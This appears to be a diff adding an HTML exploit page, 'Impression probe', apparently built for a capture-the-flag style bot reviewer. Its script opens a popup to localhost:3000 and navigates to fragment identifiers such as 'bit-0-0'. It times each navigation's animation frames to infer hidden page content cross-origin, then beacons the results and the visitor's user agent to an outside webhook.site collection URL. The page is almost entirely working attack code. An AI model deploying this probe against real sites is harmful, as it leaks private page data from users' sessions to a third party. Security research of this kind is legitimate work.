@@ -1,0 +1,45 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Impression probe</title>
+<h1>Impression probe</h1>
+<form method="post" action="http://172.237.8.236:24457/report">
+  <input name="url" id="url" size="105"><button>Run reviewer</button>
+</form>
+<pre id="out"></pre>
+<script>
+const callback = "https://webhook.site/2552eebc-b08c-488d-bd60-90fefaa9aa21";
+document.getElementById("url").value = location.href.split("?")[0] + "?run=1";
+if (location.search.includes("run=1")) (async () => {
+  const out = {ua:navigator.userAgent, results:[], events:[]};
+  const send = async () => {
+    document.getElementById("out").textContent = JSON.stringify(out, null, 2);
+    try { navigator.sendBeacon(callback, JSON.stringify(out)); }
+    catch (e) { new Image().src = callback + "?error=" + encodeURIComponent(String(e)); }
+  };
+  onblur = () => out.events.push(["blur", performance.now()]);
+  onfocus = () => out.events.push(["focus", performance.now()]);
+  try {
+    const w = window.open("http://localhost:3000/", "impressionprobe", "width=700,height=500");
+    if (!w) { out.error = "popup blocked"; await send(); return; }
+    await new Promise(r => setTimeout(r, 1500));
+    const ids = ["preview-title","missing-marker","bit-0-0","missing-marker",
+      "bit-0-1","missing-marker","bit-0-2","missing-marker","bit-0-3","missing-marker"];
+    for (let repeat = 0; repeat < 5; repeat++) for (const id of ids) {
+      await new Promise(requestAnimationFrame);
+      const t = performance.now();
+      w.location = "http://localhost:3000/#" + id;
+      const frames = []; let prev = t;
+      for (let i = 0; i < 6; i++) {
+        await new Promise(requestAnimationFrame);
+        const now = performance.now();
+        frames.push(Math.round((now - prev) * 10) / 10);
+        prev = now;
+      }
+      out.results.push({repeat, id, delta:Math.round(performance.now()-t), frames});
+    }
+    w.close();
+  } catch (e) { out.error = String(e); }
+  await send();
+  window.__IMPRESSION_DONE__ = true;
+})();
+</script>
